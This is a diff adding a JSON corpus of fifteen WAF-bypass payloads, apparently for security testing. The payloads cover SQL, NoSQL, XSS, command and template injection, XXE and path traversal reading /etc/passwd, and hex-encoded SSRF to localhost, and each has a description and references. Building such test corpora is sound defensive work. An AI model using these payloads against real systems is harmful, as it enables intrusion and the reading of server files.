@@ -1,0 +1,152 @@
+[
+  {
+    "id": "waf-001",
+    "family": "sqli",
+    "subtype": "waf_bypass",
+    "payload_string": "' /*!50000OR*/ 1=1--",
+    "context": "string",
+    "description": "MySQL version comment bypass for WAF SQL keyword filtering",
+    "references": ["https://github.com/fuzzdb-project/fuzzdb"],
+    "platform_specific": {"mysql": true, "waf_bypass": true}
+  },
+  {
+    "id": "waf-002",
+    "family": "sqli",
+    "subtype": "waf_bypass",
+    "payload_string": "' /*!UNION*/ /*!SELECT*/ 1,2,3--",
+    "context": "string",
+    "description": "MySQL inline comment to bypass UNION SELECT filter",
+    "references": ["https://github.com/fuzzdb-project/fuzzdb"],
+    "platform_specific": {"mysql": true, "waf_bypass": true}
+  },
+  {
+    "id": "waf-003",
+    "family": "sqli",
+    "subtype": "waf_bypass",
+    "payload_string": "' UnIoN SeLeCt 1,2,3--",
+    "context": "string",
+    "description": "Mixed case SQL keywords to bypass case-sensitive WAF rules",
+    "references": ["https://github.com/fuzzdb-project/fuzzdb"],
+    "platform_specific": {"waf_bypass": true}
+  },
+  {
+    "id": "waf-004",
+    "family": "xss",
+    "subtype": "waf_bypass",
+    "payload_string": "<svg/onload=alert(1)>",
+    "context": "html",
+    "description": "SVG XSS with no space between tag and event handler",
+    "references": ["https://portswigger.net/research/xss-venom"],
+    "platform_specific": {"waf_bypass": true}
+  },
+  {
+    "id": "waf-005",
+    "family": "xss",
+    "subtype": "waf_bypass",
+    "payload_string": "<ScRiPt>alert(1)</ScRiPt>",
+    "context": "html",
+    "description": "XSS with mixed case script tags to bypass filter",
+    "references": ["https://portswigger.net/research/xss-venom"],
+    "platform_specific": {"waf_bypass": true}
+  },
+  {
+    "id": "waf-006",
+    "family": "xss",
+    "subtype": "waf_bypass",
+    "payload_string": "<img src=x onerror=alert(1)//>",
+    "context": "html",
+    "description": "XSS with double slash comment to bypass trailing slash check",
+    "references": ["https://portswigger.net/research/xss-venom"],
+    "platform_specific": {"waf_bypass": true}
+  },
+  {
+    "id": "waf-007",
+    "family": "cmdi",
+    "subtype": "waf_bypass",
+    "payload_string": "';$(id)",
+    "context": "string",
+    "description": "Command injection with single quote and semicolon to bypass basic filters",
+    "references": ["https://github.com/fuzzdb-project/fuzzdb"],
+    "platform_specific": {"waf_bypass": true}
+  },
+  {
+    "id": "waf-008",
+    "family": "cmdi",
+    "subtype": "waf_bypass",
+    "payload_string": "||id||",
+    "context": "string",
+    "description": "Command injection with double pipe to bypass single pipe filter",
+    "references": ["https://github.com/fuzzdb-project/fuzzdb"],
+    "platform_specific": {"waf_bypass": true}
+  },
+  {
+    "id": "waf-009",
+    "family": "sqli",
+    "subtype": "waf_bypass",
+    "payload_string": "'/**/UNION/**/SELECT/**/1,2,3--",
+    "context": "string",
+    "description": "SQL injection with block comments as whitespace bypass",
+    "references": ["https://github.com/fuzzdb-project/fuzzdb"],
+    "platform_specific": {"waf_bypass": true}
+  },
+  {
+    "id": "waf-010",
+    "family": "xss",
+    "subtype": "waf_bypass",
+    "payload_string": "<details open ontoggle=alert(1)>",
+    "context": "html",
+    "description": "XSS using HTML5 details element to bypass script/event filters",
+    "references": ["https://portswigger.net/research/xss-venom"],
+    "platform_specific": {"waf_bypass": true}
+  },
+  {
+    "id": "waf-011",
+    "family": "ssti",
+    "subtype": "waf_bypass",
+    "payload_string": "${7*7}",
+    "context": "template",
+    "description": "SSTI detection with dollar-brace syntax for Freemarker/Groovy detection",
+    "references": ["https://portswigger.net/web-security/server-side-template-injection"],
+    "platform_specific": {"waf_bypass": true}
+  },
+  {
+    "id": "waf-012",
+    "family": "xxe",
+    "subtype": "waf_bypass",
+    "payload_string": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
+    "context": "xml",
+    "description": "XXE with single-quoted SYSTEM value to bypass double-quote filter",
+    "references": ["https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"],
+    "platform_specific": {"waf_bypass": true}
+  },
+  {
+    "id": "waf-013",
+    "family": "path_traversal",
+    "subtype": "waf_bypass",
+    "payload_string": "..%252f..%252f..%252fetc/passwd",
+    "context": "string",
+    "description": "Double URL-encoded path traversal to bypass single-encode filter",
+    "references": ["https://owasp.org/www-community/attacks/Path_Traversal"],
+    "platform_specific": {"waf_bypass": true}
+  },
+  {
+    "id": "waf-014",
+    "family": "ssrf",
+    "subtype": "waf_bypass",
+    "payload_string": "http://0x7f000001",
+    "context": "url",
+    "description": "SSRF using hex-encoded IP to bypass localhost filter",
+    "references": ["https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"],
+    "platform_specific": {"waf_bypass": true}
+  },
+  {
+    "id": "waf-015",
+    "family": "nosql",
+    "subtype": "waf_bypass",
+    "payload_string": "{\"$gt\":\"\"}",
+    "context": "json",
+    "description": "NoSQL injection using MongoDB $gt operator for WAF bypass",
+    "references": ["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_NoSQL_Injection"],
+    "platform_specific": {"waf_bypass": true, "mongodb": true}
+  }
+]
